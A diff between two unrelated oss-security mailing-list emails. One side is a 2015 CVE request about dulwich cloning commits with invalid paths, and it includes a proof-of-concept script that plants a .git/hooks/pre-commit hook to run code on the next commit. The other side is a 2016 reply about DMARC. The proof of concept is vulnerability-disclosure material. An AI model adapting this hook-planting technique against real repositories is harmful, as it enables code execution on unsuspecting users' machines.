@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2573" "Saturday" "21" "March" "2015" "10:26:24" "+0100" "Salvatore Bonaccorso" "carnil@debian.org" "<20150321092624.GA10087@eldamar.local>" "91" "[oss-security] Possible CVE Request: dulwich: does not prevent to write files in commits with invalid paths to working tree" nil nil nil "3" "2015032109:26:24" "[oss-security] Possible CVE Request: dulwich: does not prevent to write files in commits with invalid paths to working tree" (number mark "        carnil@debia Mar 21   91/2573  " thread-indent "\"[oss-security] Possible CVE Request: dulwich: does not prevent to write files in commits with invalid paths to working tree\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1901" "Monday" "19" "September" "2016" "17:33:41" "-0500" "Brad Knowles" "brad@shub-internet.org" "<FF64064C-58B8-4A27-AA23-F343C361E5CB@shub-internet.org>" "48" "Re: [oss-security] ezmlm warning" nil nil nil "9" "2016091922:33:41" "[oss-security] ezmlm warning" (number mark "U       brad@shub-in Sep 19   48/1901  " thread-indent "\"Re: [oss-security] ezmlm warning\"\n") "<20160919220600.GA17104@openwall.com>" ("<1436834771.18369.ezmlm-warn@lists.openwall.com>" "<CAPiURgVcmtPDG6APOESc5tG_sAjaA2JHOwThc+ByeSHQftDb8g@mail.gmail.com>" "<CALPTtNUgpuWSznYT77cY8fTFPMgzDW-TN-VC3agv982Socc4Qg@mail.gmail.com>" "<20150718174051.GB2727@openwall.com>" "<CALPTtNX6gO6We7_3=Wf4xXdt6er8PwmPNjCWTwhZ-0jQ5GkU-g@mail.gmail.com>" "<20160919220600.GA17104@openwall.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 30020 invoked by uid 550); 21 Mar 2015 09:26:37 -0000
+Received: (qmail 25727 invoked by uid 550); 19 Sep 2016 22:41:29 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,123 +11,85 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 30002 invoked from network); 21 Mar 2015 09:26:37 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20120113;
-        h=sender:date:from:to:cc:subject:message-id:mime-version:content-type
-         :content-disposition:user-agent;
-        bh=TBRckhHQ9Uvum8vZviLURHU6GvJd/vU2z5BNICT3Nkw=;
-        b=iKPKJdDzeVWkJsdHCz4QfJ+ioqhdeXchiL+5koquRAzTpsgaxEHaKnrMn/BTlqc9xK
-         JLp9elWWR6hdLqN19b0oWXKq9SvWYrhde5OrXeLa6kRA9x+yEzlJK76utjc1AMJyhGQx
-         CD25NGOI+BOjL1myEqqYuHNVkN1PUrqhpKFrYVxYlWDD7mb+dMSY2ofVDYvOCqnPJ4aS
-         fIqrfAi8Z8UM8a+rMGHLyZBDKq3vDI53lh+9Tbe/b7jNm2dixDUNIDCuRDUBXL4dKYTg
-         FHe2S6L5MS8RKGvFZRFkrLI8tpA/JLNJYIehd5uquScuzb9V6o5JmxQxz79kOv7lribw
-         O2yw==
-X-Received: by 10.180.7.196 with SMTP id l4mr3098897wia.44.1426929985762;
-        Sat, 21 Mar 2015 02:26:25 -0700 (PDT)
-Message-ID: <20150321092624.GA10087@eldamar.local>
-MIME-Version: 1.0
-Content-Type: multipart/mixed; boundary="envbJBWh7q8WU6mo"
-Content-Disposition: inline
-User-Agent: Mutt/1.5.23 (2014-03-12)
-Cc: CVE Assignments MITRE <cve-assign@mitre.org>,
-	Jelmer Vernooij <jelmer@debian.org>
-Date: Sat, 21 Mar 2015 10:26:24 +0100
-From: Salvatore Bonaccorso <carnil@debian.org>
 Reply-To: oss-security@lists.openwall.com
-Sender: Salvatore Bonaccorso <salvatore.bonaccorso@gmail.com>
-Subject: [oss-security] Possible CVE Request: dulwich: does not prevent to write files in
- commits with invalid paths to working tree
-To: OSS Security Mailinglist <oss-security@lists.openwall.com>
+Received: (qmail 21642 invoked from network); 19 Sep 2016 22:34:00 -0000
+X-ASG-Debug-ID: 1474324428-061c416bb09ff50001-Ebmqpw
+X-Barracuda-Envelope-From: brad@shub-internet.org
+X-Barracuda-RBL-Trusted-Forwarder: 216.194.196.20
+X-Barracuda-RBL-Trusted-Forwarder: 216.194.248.141
+X-Virus-Scanned: amavisd-new at mail-sterling.his.com
+X-Barracuda-RBL-IP: 172.16.1.3
+Mime-Version: 1.0 (Mac OS X Mail 8.2 \(2104\))
+X-ASG-Orig-Subj: Re: [oss-security] ezmlm warning
+Content-Type: multipart/signed; boundary="Apple-Mail=_BF9C8A3A-EFB5-4319-820B-42D5E502C399"; protocol="application/pgp-signature"; micalg=pgp-sha256
+X-Pgp-Agent: GPGMail 2.6.1
+From: Brad Knowles <brad@shub-internet.org>
+In-Reply-To: <20160919220600.GA17104@openwall.com>
+Date: Mon, 19 Sep 2016 17:33:41 -0500
+Cc: Brad Knowles <brad@shub-internet.org>
+Message-Id: <FF64064C-58B8-4A27-AA23-F343C361E5CB@shub-internet.org>
+References: <1436834771.18369.ezmlm-warn@lists.openwall.com> <CAPiURgVcmtPDG6APOESc5tG_sAjaA2JHOwThc+ByeSHQftDb8g@mail.gmail.com> <CALPTtNUgpuWSznYT77cY8fTFPMgzDW-TN-VC3agv982Socc4Qg@mail.gmail.com> <20150718174051.GB2727@openwall.com> <CALPTtNX6gO6We7_3=Wf4xXdt6er8PwmPNjCWTwhZ-0jQ5GkU-g@mail.gmail.com> <20160919220600.GA17104@openwall.com>
+To: oss-security@lists.openwall.com
+X-Mailer: Apple Mail (2.2104)
+X-Barracuda-Connect: smtp-nf-202.his.com[216.194.196.20]
+X-Barracuda-Start-Time: 1474324428
+X-Barracuda-URL: https://spam.his.com:443/cgi-mod/mark.cgi
+X-Barracuda-Scan-Msg-Size: 623
+X-Virus-Scanned: by bsmtpd at his.com
+X-Barracuda-BRTS-Status: 1
+X-Barracuda-Spam-Score: 0.00
+X-Barracuda-Spam-Status: No, SCORE=0.00 using global scores of TAG_LEVEL=1000.0 QUARANTINE_LEVEL=1000.0 KILL_LEVEL=7.0 tests=
+X-Barracuda-Spam-Report: Code version 3.2, rules version 3.2.3.33047
+	Rule breakdown below
+	 pts rule name              description
+	---- ---------------------- --------------------------------------------------
+Subject: Re: [oss-security] ezmlm warning
 
---envbJBWh7q8WU6mo
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
+--Apple-Mail=_BF9C8A3A-EFB5-4319-820B-42D5E502C399
+Content-Transfer-Encoding: quoted-printable
+Content-Type: text/plain;
+	charset=us-ascii
 
-Hi,
+On Sep 19, 2016, at 5:06 PM, Solar Designer <solar@openwall.com> wrote:
 
-While looking at CVE-2014-9390 I noticed
-https://lists.launchpad.net/dulwich-users/msg00827.html for dulwich reported by
-Gary van der Merwe. Does the scope of CVE-2014-9390 also include these bits
-from the above:
+> This is on my back burner.  I might approach experimenting with this
+> some months later.  I'm afraid I have other priorities right now.  For
+> now, I recommend that you don't use DMARC for addresses that you use on
+> mailing lists (posting and/or subscribing); in fact, I am likely to
+> continue to recommend this even if we do deploy a workaround for the
+> lists hosted at Openwall.
 
-dulwich happily clones a repository which contains commit with invalid
-paths, say .git/hooks/pre-commit, and thus allowing execution of code
-on subsequent commits.
+This might be verging on heresy, but do note that Mailman should now be DMA=
+RC-friendly out-of-the-box.
 
-----cut---------cut---------cut---------cut---------cut---------cut-----
-dummy@sid:~$ python PoC.py 
-dummy@sid:~$ dulwich clone PoC.git foo
-Counting objects: 5, done.
-Compressing objects: 100% (2/2), done.
-Total 5 (delta 0), reused 5 (delta 0)
-Checking out HEADdummy@sid:~$ cd foo/
-dummy@sid:~/foo$ git commit -m "test" --allow-empty
-You just got cracked! (not really but you could have been!)
-[master 9588153] test
-dummy@sid:~/foo$ ls -l /tmp/cracked 
--rw-r--r-- 1 dummy dummy 0 Mar 21 10:24 /tmp/cracked
-dummy@sid:~/foo$
-----cut---------cut---------cut---------cut---------cut---------cut-----
+--
+Brad Knowles <brad@shub-internet.org>
 
-Upstream (Jelmer Vernooij) has fixed this with commit
 
-https://git.samba.org/?p=jelmer/dulwich.git;a=commitdiff;h=091638be3c89f46f42c3b1d57dc1504af5729176
+--Apple-Mail=_BF9C8A3A-EFB5-4319-820B-42D5E502C399
+Content-Transfer-Encoding: 7bit
+Content-Disposition: attachment;
+	filename=signature.asc
+Content-Type: application/pgp-signature;
+	name=signature.asc
+Content-Description: Message signed with OpenPGP using GPGMail
 
-Does this need a separate CVE from CVE-2014-9390? 
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG/MacGPG2 v2.0.30
 
-Regards,
-Salvatore
+iQIcBAEBCAAGBQJX4GfFAAoJEKOyg2+mWTCTGngP/3magYe571NcvlqUxcfEcinA
+vUheOW2O70QEv7CBeG2elOQ/sDni5K2ryWTBjXb+loOT6nAJNcxh9XEPxsxFZJnz
+LJ4/Is9gF2mxqWN5MXzjywJnI3BkH5+ygeMEiOLcYJkV3lblvHrwoRkD18hpwxMr
+81TjuxztabFAO0PVTBLBF+0NDI80s33crfjf5dydXppPZW0+BjomnLUlYA2qPY/l
+AXhQxwOpW2TWRSdlxfwsltB7yKlCEe+rbF0/f5rW95D7dn5FPl9okoqO9pTd7M2L
+cJV2YUTpvTJbl+z+ifXYH+RSYymvlOkpqg8JPSTo5zIDg8Z1+FMq6E0Pn4H6Fky+
+C4LgY5/f+szdnEh5O1eF/v5YF1aUJ5AFUqtYYAZixHzsOa++iUkE7nBP2yB/fKie
+gC/94QWntbspTdld1snUQRJPA9Jy+/mZ0C3dYkoLqX8H3Tly9hMgIlGWluE3AFHT
+WTWBI8duwUOl1Fz6YIfVavbgvsmwuZzQzaC9pVj73wcGW90dZiV5TZNmt++TilWL
+Fo4/rt0Sf8drptBLD/kNnVbcqmJ8NOht3LI0+aGfKzlMbpa2CWMWAqK2TwUhGG0F
+93UZNxGDvXBlSmoAJp0pRh3q2HL8HIMZwsbhjuXAs4oNjUdCMrQbv76jt1Htxp9D
+VKN28LBsFPjlCBTf++Vv
+=+evG
+-----END PGP SIGNATURE-----
 
---envbJBWh7q8WU6mo
-Content-Type: text/x-python; charset=us-ascii
-Content-Disposition: attachment; filename="PoC.py"
-
-#!/usr/bin/env python2
-
-import os
-import time
-
-from dulwich.repo import Repo
-from dulwich.objects import Blob, Tree, Commit,  parse_timezone
-
-repo_dir = 'PoC.git'
-os.mkdir(repo_dir)
-repo = Repo.init_bare(repo_dir)
-
-evil_file = Blob.from_string("""#!/usr/bin/env python
-import subprocess
-subprocess.call(["/bin/touch", "/tmp/cracked"])
-print('You just got cracked! (not really but you could have been!)')
-""")
-
-hooks_tree = Tree()
-hooks_tree.add('pre-commit', 0o100755, evil_file.id)
-
-git_tree = Tree()
-git_tree.add('hooks', 0o40000, hooks_tree.id)
-
-root_tree = Tree()
-root_tree.add('.git', 0o40000, git_tree.id)
-
-commit = Commit()
-commit.tree = root_tree.id
-author = "Dr. Evil <drevil@xxxxxxxxxxx>"
-commit.author = commit.committer = author
-commit.commit_time = commit.author_time = int(time.time())
-tz = parse_timezone('-0200')[0]
-commit.commit_timezone = commit.author_timezone = tz
-commit.encoding = "UTF-8"
-commit.message = "Evil commit"
-
-repo.object_store.add_objects([
-    (evil_file, None),
-    (hooks_tree, None),
-    (git_tree, None),
-    (root_tree, None),
-    (commit, None),
-])
-
-repo.refs['refs/heads/master'] = commit.id
-
---envbJBWh7q8WU6mo--
+--Apple-Mail=_BF9C8A3A-EFB5-4319-820B-42D5E502C399--
